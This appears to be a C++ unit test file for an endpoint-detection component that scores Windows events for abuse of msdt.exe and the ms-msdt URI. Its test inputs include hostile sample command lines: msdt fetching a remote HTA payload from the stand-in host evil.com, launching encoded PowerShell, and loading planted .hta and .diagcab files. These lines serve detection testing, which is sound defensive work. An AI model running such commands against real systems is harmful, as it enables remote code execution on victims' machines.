/*
 * msdt_abuse_detector_tests.cpp - Unit tests for MsdtAbuseDetector (T1203).
 */
#include "msdt_abuse_detector_tests.h"
#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>
#include "edr_event.h"
#include "event_bus.h"
#include "msdt_abuse_detector.h"

namespace {
#define SR_CHECK(c) Check((c), #c, __LINE__)
void Check(bool c,const char* e,int l){ if(!c) throw std::runtime_error(std::string("CHECK failed at ")+std::to_string(l)+": "+e); }
edr::Event ProcEvent(uint64_t ts, const char* img, const char* cmd, const char* parent=nullptr){
    edr::Event ev; ev.type=EDR_EVT_PROCESS_START; ev.ts100ns=ts; ev.fields[edr::field::kType]="PROCESS_START"; ev.fields[edr::field::kImage]=img; if(cmd) ev.fields[edr::field::kCommandLine]=cmd; if(parent) ev.fields[edr::field::kParentImage]=parent; return ev;
}
edr::Event ScriptEvent(uint64_t ts, const char* body){
    edr::Event ev; ev.type=EDR_EVT_POWERSHELL_SCRIPT; ev.ts100ns=ts; ev.fields[edr::field::kType]="POWERSHELL_SCRIPT"; if(body) ev.fields[edr::field::kScriptBlockText]=body; return ev;
}
std::string Score(const edr::Event& e){
    auto it=e.fields.find(edr::field::kMsdtAbuseScore);
    return it==e.fields.end()?"":it->second;
}
}

void RunMsdtAbuseDetectorTests(){
    std::fprintf(stderr, "[msdt] TestDisabled\n");
    {
        edr::MsdtAbuseDetector d(false,55,300,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\msdt.exe","msdt.exe ms-msdt:/id PCWDiagnostic /skip force /af C:\\Users\\Public\\evil.hta");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[msdt] TestMsMsdtUri\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","winword.exe ms-msdt:/id PCWDiagnostic /skip force");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90");
    }
    std::fprintf(stderr, "[msdt] TestRemotePayload\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\msdt.exe","msdt.exe /id PCWDiagnostic /skip force /af http://evil.com/payload.hta");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90");
    }
    std::fprintf(stderr, "[msdt] TestScriptInterpreter\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\msdt.exe","msdt.exe /id PCWDiagnostic /moreoptions false powershell -enc AAAA");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[msdt] TestWritableDiag\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\msdt.exe","msdt.exe /id PCWDiagnostic /af C:\\Users\\Public\\evil.diagcab");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[msdt] TestOfficeParentBoost\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\msdt.exe","msdt.exe /id PCWDiagnostic","C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[msdt] TestPlainIdArgs\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\msdt.exe","msdt.exe /id WindowsUpdateDiagnostic");
        d.Enrich(ev); SR_CHECK(Score(ev)=="75");
    }
    std::fprintf(stderr, "[msdt] TestScriptSurface\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ScriptEvent(10000000ULL,"Start-Process ms-msdt:/id PCWDiagnostic");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90");
    }
    std::fprintf(stderr, "[msdt] TestEmptyScriptSilent\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ScriptEvent(10000000ULL,nullptr);
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[msdt] TestBareSilent\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\msdt.exe","msdt.exe");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[msdt] TestBenignSilent\n");
    {
        edr::MsdtAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\notepad.exe","notepad.exe");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[msdt] all passed\n");
}
